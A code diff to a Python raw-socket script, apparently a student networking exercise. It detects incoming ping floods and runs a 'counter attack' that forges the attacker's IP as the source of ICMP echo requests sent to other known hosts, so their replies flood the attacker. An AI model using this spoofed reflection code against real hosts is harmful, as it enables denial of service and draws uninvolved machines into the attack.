@@ -6,6 +6,8 @@ import sys
 ETH_P_ALL = 0x0003
 protocodes = {1: "ICMP", 17: "UDP", 6: "TCP"}
 
+local_ip = "10.0.0.12"
+
 
 def checksum(msg):
     s = 0
@@ -24,27 +26,25 @@ def bytes_to_mac(bytesmac):
 
 
 try:
-    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(ETH_P_ALL))
+    receiver_socket = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(ETH_P_ALL))
+    sender_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.getprotobyname("icmp"))
 except OSError as msg:
     print('Error' + str(msg))
     sys.exit(1)
 
 print('Socket created!')
 
-s.bind(('eth0', 0))
-ipList = {}
+receiver_socket.bind(('eth0', 0))
+sender_socket.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
+ipList = {local_ip: [0, datetime.datetime.now()]}
 
 
 def counter_attack(attacker_ip):
     print("Attacked by " + attacker_ip)
     for ip in ipList:
         if ip != attacker_ip:
-            print("Counter attack started with friend IP: " + ip)
             ###################
             # Include IP header
-            sender_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.getprotobyname(
-                "icmp"))  # This option controls whether datagrams may be broadcast from the socket. The value has type int; a nonzero value means “yes”.
-            sender_socket.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
 
             ##########################
             # ICMP Echo Request Header
@@ -53,7 +53,7 @@ def counter_attack(attacker_ip):
             mychecksum = 0
             identifier = 12345
             seqnumber = 0
-            payload = b"istoehumteste"
+            payload = b""
 
             # Pack ICMP header fields
             icmp_packet = struct.pack("!BBHHH%ds" % len(payload), type, code, mychecksum, identifier, seqnumber,
@@ -77,7 +77,6 @@ def counter_attack(attacker_ip):
             ip_ttl = 255
             ip_proto = socket.IPPROTO_ICMP
             ip_check = 0  # automaticamente preenchido - AF_INET
-            print("Attacker: " + attacker_ip)
             ip_saddr = socket.inet_aton(attacker_ip)
             ip_daddr = socket.inet_aton(ip)
 
@@ -98,16 +97,11 @@ def counter_attack(attacker_ip):
 
 
 while True:
-    (packet, addr) = s.recvfrom(65536)
-
+    (packet, addr) = receiver_socket.recvfrom(65536)
     eth_length = 14
     eth_header = packet[:14]
 
     eth = struct.unpack("!6s6sH", eth_header)
-
-    # print("MAC Dst: "+bytes_to_mac(eth[0]))
-    # print("MAC Src: "+bytes_to_mac(eth[1]))
-    # print("Type: "+hex(eth[2]))
 
     if eth[2] == 0x0800:  # protocolo IP
         # print("IP Packet")
@@ -117,7 +111,6 @@ while True:
         version = version_ihl >> 4
         ihl = version_ihl & 0xF
         iph_length = ihl * 4
-        ttl = iph[5]
         protocol = iph[6]
         s_addr = socket.inet_ntoa(iph[8])
         d_addr = socket.inet_ntoa(iph[9])
@@ -126,13 +119,8 @@ while True:
             icmph = struct.unpack("!BBHHH%ds" % (len(icmp_header) - 8), icmp_header)
             type = icmph[0]
             code = icmph[1]
-            mychecksum = icmph[2]
-            identifier = icmph[3]
-            seqnumber = icmph[4]
-            payload = icmph[5]
-            if type == 8 and code == 0:
+            if type == 8 and code == 0 and d_addr == local_ip:
                 print("Recebi ping request de {0} - {1} ".format(bytes_to_mac(eth[1]), s_addr))
-                print("ICMP Echo Request")
                 if s_addr not in ipList or datetime.datetime.now() > ipList[s_addr][1] + datetime.timedelta(seconds=5):
                     ipList[s_addr] = [0, datetime.datetime.now()]
                 else:
